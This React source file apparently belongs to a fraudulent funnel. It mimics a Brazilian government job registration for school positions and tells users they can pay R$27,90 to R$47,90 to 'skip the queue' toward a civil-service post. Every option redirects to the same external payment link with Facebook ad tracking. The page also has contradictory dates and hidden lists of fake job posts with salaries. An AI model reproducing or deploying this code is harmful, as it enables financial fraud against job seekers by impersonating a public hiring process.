import React, { useState } from 'react';
import useUtmNavigator from '../hooks/useUtmNavigator';
import { usePixelTracking } from '../hooks/usePixelTracking';

const Upsell2: React.FC = () => {
  usePixelTracking();
  
  const navigate = useUtmNavigator();
  const [selectedOption, setSelectedOption] = useState<string>('');

  const handleConfirmOption = () => {
    if (!selectedOption) {
      alert('Por favor, selecione uma das opções para prosseguir.');
      return;
    }

      // Redirect to the new checkout URL regardless of selected option
      window.location.href = 'https://pay.inscricao-agenteescoladofuturo.online/2wq7Gr7QLPbgBAN?utm_source=FB&utm_campaign={{campaign.name}}|{{campaign.id}}&utm_medium={{adset.name}}|{{adset.id}}&utm_content={{ad.name}}|{{ad.id}}&utm_term={{placement}}';
  };

  return (
    <main className="container mx-auto px-4 py-4 flex-grow">
      <div className="max-w-2xl mx-auto">
        <h1 className="text-3xl font-semibold mb-4 text-[#1351B4]">
          Inscrição Confirmada!
        </h1>

        <div className="border-t border-b border-gray-300 py-3 mb-6">
          <div className="text-gray-700 text-sm">
            <p>Publicado em 29/05/2025 17h37</p>
            <p>Atualizado em 01/05/2025 18h29</p>
          </div>
        </div>

        {/* Termos e Autorização */}
        <div className="text-center p-5 rounded-2xl mb-6">
          <h1 className="text-2xl font-bold text-[#1351B4] mb-4">
            Parabéns! Você é o 729º Candidato!
          </h1>
          <p className="text-lg mt-2">
            Como candidato selecionado, você tem a <strong>oportunidade exclusiva</strong> de pular a fila e
            aumentar suas chances de ser aprovado na próxima fase, garantindo sua vaga como <strong>funcionário
            público</strong>.
          </p>
        </div>

        <div className="text-center mx-auto max-w-md border-2 border-[#1351B4] rounded-2xl p-5 pt-2 mb-15">
          <p className="text-base mt-2 text-center mb-5 font-bold">
            Escolha uma das opções abaixo para prosseguir:
          </p>
          
          <div className="space-y-4 text-left">
            <label className="flex items-start gap-2 cursor-pointer">
              <input 
                type="radio" 
                name="opcao" 
                value="pagar"
                checked={selectedOption === 'pagar'}
                onChange={(e) => setSelectedOption(e.target.value)}
                className="mt-1"
              />
              <span>Quero ser um dos <strong>20 primeiros</strong> (R$47,90).</span>
            </label>

            <label className="flex items-start gap-2 cursor-pointer">
              <input 
                type="radio" 
                name="opcao" 
                value="fila"
                checked={selectedOption === 'fila'}
                onChange={(e) => setSelectedOption(e.target.value)}
                className="mt-1"
              />
              <span>Quero ser um dos <strong>100 primeiros</strong> (R$37,90).</span>
            </label>

            <label className="flex items-start gap-2 cursor-pointer">
              <input 
                type="radio" 
                name="opcao" 
                value="desistir"
                checked={selectedOption === 'desistir'}
                onChange={(e) => setSelectedOption(e.target.value)}
                className="mt-1"
              />
              <span>Quero ser um dos <strong>200 primeiros</strong> (R$27,90).</span>
            </label>
          </div>

          <div className="text-center mt-5">
            <button 
              onClick={handleConfirmOption}
              className="text-lg text-white py-2 px-8 bg-[#1351B4] rounded-2xl font-bold hover:bg-[#1351B4]/90 transition-colors"
            >
              CONFIRMAR OPÇÃO
            </button>
          </div>
        </div>

        {/* Resultados da Busca */}
        <div id="resultados-busca" className="hidden">
          <h3 className="text-lg font-semibold text-gray-800 mb-4">
            <i className="fas fa-school mr-2"></i>
            Escolas Municipais Próximas
          </h3>
          <div id="lista-escolas" className="grid gap-4 mb-8">
            {/* Escolas serão inseridas aqui dinamicamente */}
          </div>
        </div>

        {/* Quiz de Seleção de Cargo */}
        <div id="quiz-cargo" className="hidden bg-gray-50 border border-gray-200 rounded-lg p-6">
          {/* Título Principal em Destaque */}
          <div className="bg-blue-600 text-white rounded-lg p-4 mb-6 text-center">
            <h2 className="text-2xl font-bold mb-2">
              <i className="fas fa-hand-point-right mr-2"></i>
              SELECIONE UMA OPÇÃO DE CARGO
            </h2>
            <p className="text-blue-100">Escolha o cargo disponível para sua região</p>
          </div>

          <h3 className="text-lg font-semibold text-gray-800 mb-4">
            <i className="fas fa-clipboard-list mr-2"></i>
            Cargos Disponíveis na sua Região
          </h3>
          <p className="text-gray-600 mb-6">Escolha o cargo que melhor se adequa ao seu perfil e experiência:</p>

          <div className="space-y-4">
            <label className="flex items-start p-4 border border-gray-200 rounded-lg cursor-pointer hover:bg-blue-50 hover:border-blue-300 transition-colors">
              <input type="radio" name="cargo" value="agente-alimentacao" className="mt-1 mr-3" />
              <div>
                <div className="font-medium text-gray-800">Agente de Alimentação Escolar</div>
                <div className="text-sm text-gray-600">Responsável pela preparação e distribuição da alimentação nas escolas</div>
                <div className="text-sm text-blue-600 font-medium mt-1">R$ 1.320,00 - R$ 1.650,00 • 40h semanais</div>
              </div>
            </label>

            <label className="flex items-start p-4 border border-gray-200 rounded-lg cursor-pointer hover:bg-blue-50 hover:border-blue-300 transition-colors">
              <input type="radio" name="cargo" value="auxiliar-educacao" className="mt-1 mr-3" />
              <div>
                <div className="font-medium text-gray-800">Auxiliar de Educação Infantil</div>
                <div className="text-sm text-gray-600">Apoio pedagógico e cuidados com crianças de 0 a 5 anos</div>
                <div className="text-sm text-blue-600 font-medium mt-1">R$ 1.412,00 - R$ 1.800,00 • 40h semanais</div>
              </div>
            </label>

            <label className="flex items-start p-4 border border-gray-200 rounded-lg cursor-pointer hover:bg-blue-50 hover:border-blue-300 transition-colors">
              <input type="radio" name="cargo" value="monitor-transporte" className="mt-1 mr-3" />
              <div>
                <div className="font-medium text-gray-800">Monitor de Transporte Escolar</div>
                <div className="text-sm text-gray-600">Acompanhamento e segurança dos estudantes no transporte</div>
                <div className="text-sm text-blue-600 font-medium mt-1">R$ 1.100,00 - R$ 1.400,00 • 30h semanais</div>
              </div>
            </label>

            <label className="flex items-start p-4 border border-gray-200 rounded-lg cursor-pointer hover:bg-blue-50 hover:border-blue-300 transition-colors">
              <input type="radio" name="cargo" value="assistente-admin" className="mt-1 mr-3" />
              <div>
                <div className="font-medium text-gray-800">Assistente Administrativo Educacional</div>
                <div className="text-sm text-gray-600">Apoio administrativo e secretarial nas unidades escolares</div>
                <div className="text-sm text-blue-600 font-medium mt-1">R$ 1.500,00 - R$ 1.900,00 • 40h semanais</div>
              </div>
            </label>
          </div>

          <div className="mt-6 text-center">
            <button 
              id="confirmar-cadastro" 
              className="bg-blue-600 hover:bg-blue-700 text-white font-medium py-3 px-8 rounded-md transition-colors duration-200"
            >
              <i className="fas fa-user-plus mr-2"></i>
              Confirmar Cadastro
            </button>
          </div>
        </div>
      </div>
    </main>
  );
};

export default Upsell2;